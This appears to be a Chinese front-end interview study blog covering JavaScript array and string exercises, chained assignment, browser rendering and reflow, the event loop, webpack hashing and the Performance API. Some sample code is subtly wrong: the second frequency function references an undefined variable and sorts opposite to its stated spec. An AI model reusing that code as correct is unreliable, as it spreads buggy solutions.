<h2 id="阿里钉钉面试题"><a href="#阿里钉钉面试题" class="headerlink" title="阿里钉钉面试题"></a>阿里钉钉面试题</h2><ul>
<li><p>排除数组指定内容(考察filter用法)</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 说明：实现一个exclude方法，从数组中排除掉指定内容</span></span><br><span class="line"><span class="comment">* 示例：</span></span><br><span class="line"><span class="comment">*  exclude([1, 2, 'a', 2], 2); // 返回 [1, 'a']</span></span><br><span class="line"><span class="comment">*  exclude([1, 'a', 2, 'a'], 1, 'a'); // 返回 [2]</span></span><br><span class="line"><span class="comment">*  exclude([1, 2, 3]); // 返回 [1, 2, 3]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exclude</span>(<span class="params">arr, ...param</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 注：不定参数用...param表示，param是数据对象，无该参数时表示空数组</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 额外拓展：arguments囊括所以的参数</span></span><br><span class="line">  <span class="comment">// arguments: 可以取到不定参数的具体内容, </span></span><br><span class="line">  <span class="comment">//    如 exclude([1, 2, 'a', 2], 2) 则输出[[1, 2, 'a', 2], 2]</span></span><br><span class="line">  <span class="comment">//    如 exclude([1, 'a', 2, 'a'], 1, 'a') 则输出[[1, 2, 'a', 2], 1, 'a']</span></span><br><span class="line">  <span class="comment">// arguments.length 表示参数的个数，这样可以取到不定参数的个数</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 代码实现 */</span></span><br><span class="line">  <span class="keyword">return</span> arr.filter(<span class="function">(<span class="params">item, index, self</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> !param.includes(item); <span class="comment">// 注filter return语句中为true则保留，为false则去除</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>字符频率统计（考察sort方法、字符串charCodeAt方法）</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 说明：给定一个字符串，将字符串里的字符按照出现的频率升序排列并统计输出。</span></span><br><span class="line"><span class="comment">  *   1. 字符串的字符只有小写字母</span></span><br><span class="line"><span class="comment">  *   2. 输出格式是字符+频次，如 aaaa 输出 a4</span></span><br><span class="line"><span class="comment">  *   3. 升序排序优先按频次排序，频次相同时按字母升序排序，如  ccbbabaa 输出 c2a3b3 </span></span><br><span class="line"><span class="comment">  * 示例：</span></span><br><span class="line"><span class="comment">  *   frequency('dabhppa');  // 输出 b1d1h1a2p2</span></span><br><span class="line"><span class="comment">  *   frequency('cb'); // 输出 b1c1</span></span><br><span class="line"><span class="comment">  *   frequency('accabcb'); // 输出 a2b2c3</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 只考虑按字符顺序输出：frequency('dabhppa'); 输出  a2b1d1h1p2</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">frequency</span>(<span class="params">chars</span>) </span>&#123;</span><br><span class="line">  <span class="comment">/* 代码实现 */</span></span><br><span class="line">  <span class="comment">// 思路涉及到排序先想到sort方法，但是sort方法时Array的方法，所以想到先将字符串使用split('')转成数组，用sort()排序后再用join()方法转成字符串</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 第一步：排序</span></span><br><span class="line">  <span class="keyword">var</span> sortChars = chars.split(<span class="string">''</span>).sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a.charCodeAt() - b.charCodeAt();</span><br><span class="line">  &#125;).join(<span class="string">''</span>); <span class="comment">// 这样操作之后会得到已排序好的字符</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 第二步：收集key value</span></span><br><span class="line">  <span class="keyword">let</span> obj = &#123;&#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; sortChars.length; i += <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (obj[sortChars[i]]) &#123;</span><br><span class="line">      obj[sortChars[i]]++;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      obj[sortChars[i]] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(obj);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 第三步：输出</span></span><br><span class="line">  <span class="keyword">let</span> str = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">    str += <span class="string">`<span class="subst">$&#123;key&#125;</span><span class="subst">$&#123;obj[key]&#125;</span>`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(str);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> str</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 真实实现，先按数量再按字符输出：frequency('helloworld');  输出 l3o2d1e1h1r1w1</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">frequency</span>(<span class="params">chars</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// char = 'helloworld'</span></span><br><span class="line">  <span class="keyword">var</span> arr = char</span><br><span class="line">    .split(<span class="string">''</span>) <span class="comment">// ['h', 'e', 'l', 'l', 'o', 'w', 'o', 'r', 'l', 'd']</span></span><br><span class="line">    .sort() <span class="comment">// ['d', 'e', 'h', 'l', 'l', 'l', 'o', 'o', 'r', 'w']</span></span><br><span class="line">    .join(<span class="string">''</span>) <span class="comment">// dehllloorw</span></span><br><span class="line">    .match(<span class="regexp">/([a-z])\1*/g</span>) <span class="comment">// ['d', 'e', 'h', 'lll', 'oo', 'r', 'w']</span></span><br><span class="line">    .sort(<span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> b.length - a.length</span><br><span class="line">    &#125;) <span class="comment">// ['lll', 'oo', 'd', 'e', 'h', 'r', 'w']</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> str = <span class="string">''</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">in</span> arr) &#123;</span><br><span class="line">    str += <span class="string">`<span class="subst">$&#123;arr[i][<span class="number">0</span>]&#125;</span><span class="subst">$&#123;arr[i].length&#125;</span>`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> str</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<h2 id="面试题：js连续赋值运算"><a href="#面试题：js连续赋值运算" class="headerlink" title="面试题：js连续赋值运算"></a>面试题：js连续赋值运算</h2><p>描述下面的结果，为什么？<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;<span class="attr">n</span>: <span class="number">1</span>&#125;;</span><br><span class="line">b = a;</span><br><span class="line">a.x = a = &#123;<span class="attr">n</span>: <span class="number">2</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(a, b); <span class="comment">// &#123;n: 2&#125;、&#123;n: 1, x: &#123;n: 2&#125;&#125;</span></span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>参考：<a href="https://blog.csdn.net/dcof99817/article/details/102343098" target="_blank" rel="noopener">https://blog.csdn.net/dcof99817/article/details/102343098</a></p>
</blockquote>
<p>注意点：</p>
<ol>
<li>赋值运算符（”=”）是自右向左的。</li>
<li>字段访问运算符（”.”）优先级 &gt; 赋值运算符。</li>
</ol>
<p>解析：</p>
<ol>
<li><p>.运算符优先级最大，先执行 <code>a.x</code> ，此时a指向 <code>{n: 1}</code>，称之为A对象。<br><img src="../images/javascript/js_zhizhen1.jpg" title=""></p>
</li>
<li><p>a中没有x属性，所以 <code>a.x</code> 为undefined，即a指向 <code>{n: 1, x: undefined}</code>。由于a、b共用存储地址，所以b也指向 <code>{n: 1, x: undefined}</code>。<br><img src="../images/javascript/js_zhizhen2.jpg" title=""></p>
</li>
<li><p>开始赋值运算，自右向左先执行 <code>a = {n: 2}</code>。在堆中创建对象B，即 <code>{n: 2}</code>，a新指向了对象B，b暂未改变。<br><img src="../images/javascript/js_zhizhen3.jpg" title=""></p>
</li>
<li><p>再执行 <code>a.x = a</code>，<span style="color:red"><strong>由于一开始js已经先计算了 <code>a.x</code>，便已经解析了这个 <code>a.x</code> 是对象A的x，所以在同一条公式的情况下再回来给 <code>a.x</code> 赋值，也不会说重新解析这个 <code>a.x</code> 为对象B的x。</strong></span><br>相当于把对象A的x属性指向了对象B。<br>导致 <code>b = {n: 1, x: {n: 2}}</code>，a未改变 <code>a = {n: 2}</code><br><img src="../images/javascript/js_zhizhen4.jpg" title=""></p>
</li>
</ol>
<hr>
<h2 id="页面渲染机制与性能优化"><a href="#页面渲染机制与性能优化" class="headerlink" title="页面渲染机制与性能优化"></a>页面渲染机制与性能优化</h2><h3 id="浏览器渲染过程"><a href="#浏览器渲染过程" class="headerlink" title="浏览器渲染过程"></a>浏览器渲染过程</h3><ol>
<li><p>什么是DOCTYPE及作用<br><code>DTD</code>(<code>document type definitiion</code>，文档类型定义)是一系列的语法规则，用来定义 <code>XML</code> 或 <code>(X)HTML</code>的文件类型。浏览器会使用它来判断文档类型，决定使用何种协议来解析，以及切换浏览器模式。<br><code>DOCTYPE</code> 是用来申明文档类型和 <code>DTD</code> 规范的，一个主要的用途是文件的合法性验证。如果文件代码不合法，那么浏览器解析时会出一些错。<br>指示 web 浏览器关于页面使用哪个 <code>HTML</code> 版本进行编写的指令。</p>
<ul>
<li><p>html5</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>html4.01 Strict<br>该 DTD 包含所有 HTML 元素和属性，但不包括展示性的和弃用的元素（比如 font）。不允许框架集（Framesets）。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>html4.01 Transitional<br>该 DTD 包含所有 HTML 元素和属性，包括展示性的和弃用的元素（比如 font）。不允许框架集（Framesets）。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" </span></span><br><span class="line"><span class="meta">"http://www.w3.org/TR/html4/loose.dtd"&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>html4.01 Frameset<br>该 DTD 包含所有 HTML 元素和属性，但不包括展示性的和弃用的元素（比如 font）。允许框架集（Framesets）。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN" </span></span><br><span class="line"><span class="meta">"http://www.w3.org/TR/html4/frameset.dtd"&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>网页请求过程(输入url开始发生了什么)<br><strong>输入url回车 –&gt; 解析url –&gt; DNS解析 –&gt; 建立TCP链接(三次握手) –&gt; 客户端发起请求 –&gt; 服务端响应请求 –&gt; 渲染页面 –&gt; 断开连接</strong></p>
</li>
<li><p>浏览器渲染过程</p>
<blockquote>
<p>参考：<a href="https://segmentfault.com/a/1190000016458627#articleHeader4" target="_blank" rel="noopener">segmentfault 浏览器渲染过程</a></p>
</blockquote>
<ul>
<li><p>webkit渲染过程图<br><img src="../images/javascript/browser_webkit.png" title="webkit内核渲染过程图"></p>
</li>
<li><p>gecko渲染过程图<br><img src="../images/javascript/browser_gecko.png" title="gecko内核渲染过程图"></p>
</li>
</ul>
<p>这两个内核的渲染流程大同小异，主要的过程可以总结为下列5个：</p>
<ul>
<li>DomTree: 解析html构建DOM树。</li>
<li>CssomTree: 解析CSS生成CSSOM规则树。</li>
<li>RenderObjectTree: 将DOM树与CSSOM规则树合并在一起生成渲染对象树。</li>
<li>Layout: 遍历渲染树开始布局(layout)，计算每个节点的位置大小信息。</li>
<li>Painting: 将渲染树每个节点绘制到屏幕。</li>
</ul>
</li>
<li><p>重排（回流）Reflow<br><strong>重排一定会触发重绘，而重绘不一定会重排</strong></p>
<blockquote>
<p>参考：<a href="https://segmentfault.com/a/1190000016458627#articleHeader7" target="_blank" rel="noopener">segmentfault 浏览器渲染过程</a></p>
</blockquote>
<ul>
<li><p>定义<br>重排（Reflow）是指元素的大小、位置发生了改变，而导致了布局的变化，从而导致了布局树的重新构建和渲染。</p>
</li>
<li><p>触发Reflow<br>1.) 增加、删除、修改 <code>DOM</code> 节点时<br>2.) 移动 <code>DOM</code> 位置的时候，比如某个动画<br>3.) 元素尺寸改变（margin、padding、border、width、height）<br>4.) 元素内容改变<br>5.) 页面渲染器初始化<br>6.) 浏览器窗口改变的时候</p>
</li>
<li><p>面试提示：如何避免？<br>1.) 分离读写操作<br>2.) 样式集中改变或切换class<br>3.) 动画类使用absolute脱离文档流<br>4.) 使用 display:none；</p>
</li>
</ul>
</li>
<li><p>重绘Repaint<br><strong>重排一定会触发重绘，而重绘不一定会重排</strong></p>
<ul>
<li><p>定义<br>重绘是指css样式的改变，但元素的大小和尺寸不变，而导致节点的重新绘制。</p>
</li>
<li><p>触发Repaint<br>任何对元素样式，如 <code>background-color</code>、<code>border-color</code>、<code>visibility</code> 等属性的改变。css 和 js 都可能引起重绘。</p>
</li>
<li><p>面试提示：如何最小程度的降低Repaint<br>1.) DOM离线修改，先display:none，改完之后再显示<br>2.) 样式集中改变或切换class</p>
</li>
</ul>
</li>
</ol>
<ol start="6">
<li>布局Layout</li>
</ol>
<h3 id="js运行机制"><a href="#js运行机制" class="headerlink" title="js运行机制"></a>js运行机制</h3><p>参考<a href="https://juejin.im/post/59e85eebf265da430d571f89" target="_blank" rel="noopener">掘金 彻底弄懂 JavaScript 执行机制</a></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="number">1</span>);</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">2</span>);</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出: 1 3 2</span></span><br><span class="line"><span class="comment">// 因为setTimeout是一个异步任务</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">'A'</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'B'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出: A</span></span><br><span class="line"><span class="comment">// 且浏览器会不断的执行，导致崩溃。因为while是一个同步任务</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">'A'</span>);</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'B'</span>);</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出: A</span></span><br><span class="line"><span class="comment">// setTimeout内部永远不会被执行</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i);</span><br><span class="line">  &#125;, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出: 4 4 4 4</span></span><br><span class="line"><span class="comment">// 因为for循环是同步任务，每次循环产生的setTimeout都会放到异步对列中。执行完同步之后再执行异步，此时已经有四个待执行的异步任务了，而因为 i 是一个全局变量，所以会输出4个4</span></span><br><span class="line"><span class="comment">// 即：同步for循环(i=0、i=1、i=2、i=3) -&gt; 异步</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 改进（es6 let）</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i);</span><br><span class="line">  &#125;, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出: 0 1 2 3，注意：内部setTimeout的时间如果设置为3000，则会在3s后输出0 1 2 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 改进（内部使用自执行函数）：</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">  (<span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(i);</span><br><span class="line">    &#125;, <span class="number">0</span>);</span><br><span class="line">  &#125;)(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出: 0 1 2 3，注意：内部setTimeout的时间如果设置为3000，则会在3s后输出0 1 2 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意：某些情况下可以使用递归自执行函数解决</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (i === <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'结束了'</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i);</span><br><span class="line">    log(i + <span class="number">1</span>);</span><br><span class="line">  &#125;, <span class="number">0</span>);</span><br><span class="line">&#125;)(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 输出: 0 1 2 3，注意：内部setTimeout的时间如果设置为3000，则会在每3s输出一个数，适用于有依赖关系的循环</span></span><br></pre></td></tr></table></figure>
<p>异步任务：</p>
<ul>
<li>setTimeout、setInterval</li>
<li>DOM事件</li>
<li>ES6 Promise</li>
</ul>
<p>原理：js 是单线程的，任务队列分为同步任务和异步任务。</p>
<h3 id="页面性能监控-performance"><a href="#页面性能监控-performance" class="headerlink" title="页面性能监控 performance"></a>页面性能监控 performance</h3><p><strong> Performance </strong> — 前端性能监控利器</p>
<blockquote>
<p>参考：<a href="https://www.cnblogs.com/bldxh/p/6857324.html" target="_blank" rel="noopener">cnblogs Performance 前端性能监控利器</a></p>
</blockquote>
<h4 id="hash、chunkhash、contenthash"><a href="#hash、chunkhash、contenthash" class="headerlink" title="hash、chunkhash、contenthash"></a>hash、chunkhash、contenthash</h4><ul>
<li><p>hash: 跟整个项目的构建有关，构建生成的文件hash值都是一样的。同一次构建过程中生成的hash都是一样的，只要有文件修改，整个项目构建的hash都会发生变化。图片等资源例外，每个图片资源都拥有自己的hash，不同于全局hash。</p>
</li>
<li><p>chunkhash: 根据不同的入口文件（entry）进行依赖文件分析、构建对应的chunk，生成对应的hash值。生产环境中，将公共库和入口文件分开打包构建，再采用chunkhash的方式生成。这样在不改动公共文件的情况下，hash值不会受影响。<br>chunkhash只能用在生产环境不能用在开发环境。</p>
</li>
<li><p>contenthash: 由文件内容产生的hash值，内容不同产生的contenthash就会不一致。通常把项目中的css都抽离出对应的css文件来加以引用。<br>contenthash是extract-text-webpack-plugin插件引入的，解决修改样式文件导致js重新生成hash。</p>
</li>
</ul>
<p>结论：</p>
<ol>
<li>全局 Hash 和 js、css 的 hash一致</li>
<li>图片、字体等资源只有hash，但是该 hash 只是该图片自身的，不同于全局hash</li>
<li>如果对css使用chunkhash，它与依赖的chunk公用chunkhash，css和js的chunkhash是一致的。修改了js，css的hash也会变化。修改了css，js的hash值也会变化。</li>
<li>图片字体等使用hash，js使用chunkhash，css使用contenthash</li>
</ol>
<h4 id="navigation属性-页面来源"><a href="#navigation属性-页面来源" class="headerlink" title="navigation属性 页面来源"></a>navigation属性 页面来源</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.performance.navigation</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left">type常数</th>
<th style="text-align:left">枚举值</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">TYPE_NAVIGATE</td>
<td style="text-align:left">0</td>
<td style="text-align:left">普通进入，包括：点击链接、在地址栏中输入 URL、表单提交、或者通过除下表中 TYPE_RELOAD 和 TYPE_BACK_FORWARD 的方式初始化脚本。</td>
</tr>
<tr>
<td style="text-align:left">TYPE_RELOAD</td>
<td style="text-align:left">1</td>
<td style="text-align:left">通过刷新进入，包括：浏览器的刷新按钮、快捷键刷新、location.reload()等方法。</td>
</tr>
<tr>
<td style="text-align:left">TYPE_BACK_FORWARD</td>
<td style="text-align:left">2</td>
<td style="text-align:left">通过操作历史记录进入，包括：浏览器的前进后退按钮、快捷键操作、history.forward()、history.back()、history.go(num)。</td>
</tr>
<tr>
<td style="text-align:left">TYPE_UNDEFINED</td>
<td style="text-align:left">255</td>
<td style="text-align:left">其他非以上类型的方式进入。</td>
</tr>
</tbody>
</table>
<h4 id="memory属性-内存情况"><a href="#memory属性-内存情况" class="headerlink" title="memory属性 内存情况"></a>memory属性 内存情况</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.performance.memory</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left">属性</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">jsHeapSizeLimit</td>
<td style="text-align:left">内存大小限制</td>
</tr>
<tr>
<td style="text-align:left">totalJSHeapSize</td>
<td style="text-align:left">可使用的内存</td>
</tr>
<tr>
<td style="text-align:left">usedJSHeapSize</td>
<td style="text-align:left">JS对象(包括V8引擎内部对象)占用的内存，不能大于totalJSHeapSize，如果大于，有可能出现了内存泄漏</td>
</tr>
</tbody>
</table>
<h4 id="timing属性-所有的时间"><a href="#timing属性-所有的时间" class="headerlink" title="timing属性 所有的时间"></a>timing属性 所有的时间</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.performance.timing</span><br></pre></td></tr></table></figure>
<p><img src="../images/javascript/js_performance_timing.png" title="performance.timing()" width="100%"><br>按触发顺序排列所有属性：</p>
<table>
<thead>
<tr>
<th style="text-align:left">属性</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">navigationStart</td>
<td style="text-align:left">在同一个浏览器上下文中，前一个网页（与当前页面不一定同域）unload 的时间戳，如果无前一个网页 unload ，则与 fetchStart 值相等</td>
</tr>
<tr>
<td style="text-align:left">unloadEventStart</td>
<td style="text-align:left">前一个网页（与当前页面同域）unload 的时间戳，如果无前一个网页 unload 或者前一个网页与当前页面不同域，则值为 0</td>
</tr>
<tr>
<td style="text-align:left">unloadEventEnd</td>
<td style="text-align:left">和 unloadEventStart 相对应，返回前一个网页 unload 事件绑定的回调函数执行完毕的时间戳</td>
</tr>
<tr>
<td style="text-align:left">redirectStart</td>
<td style="text-align:left">第一个 HTTP 重定向发生时的时间。有跳转且是同域名内的重定向才算，否则值为 0</td>
</tr>
<tr>
<td style="text-align:left">redirectEnd</td>
<td style="text-align:left">最后一个 HTTP 重定向完成时的时间。有跳转且是同域名内的重定向才算，否则值为 0</td>
</tr>
<tr>
<td style="text-align:left">fetchStart</td>
<td style="text-align:left">浏览器准备好使用 HTTP 请求抓取文档的时间，这发生在检查本地缓存之前</td>
</tr>
<tr>
<td style="text-align:left">domainLookupStart</td>
<td style="text-align:left">DNS 域名查询开始的时间，如果使用了本地缓存（即无 DNS 查询）或持久连接，则与 fetchStart 值相等</td>
</tr>
<tr>
<td style="text-align:left">domainLookupEnd</td>
<td style="text-align:left">DNS 域名查询完成的时间，如果使用了本地缓存（即无 DNS 查询）或持久连接，则与 fetchStart 值相等</td>
</tr>
<tr>
<td style="text-align:left">connectStart</td>
<td style="text-align:left">HTTP（TCP） 开始建立连接的时间，如果是持久连接，则与 fetchStart 值相等,如果在传输层发生了错误且重新建立连接，则这里显示的是新建立的连接开始的时间</td>
</tr>
<tr>
<td style="text-align:left">connectEnd</td>
<td style="text-align:left">HTTP（TCP） 完成建立连接的时间（完成握手），如果是持久连接，则与 fetchStart 值相等,如果在传输层发生了错误且重新建立连接，则这里显示的是新建立的连接完成的时间<br><strong>注意</strong>：这里握手结束，包括安全连接建立完成、SOCKS 授权通过</td>
</tr>
<tr>
<td style="text-align:left">secureConnectionStart</td>
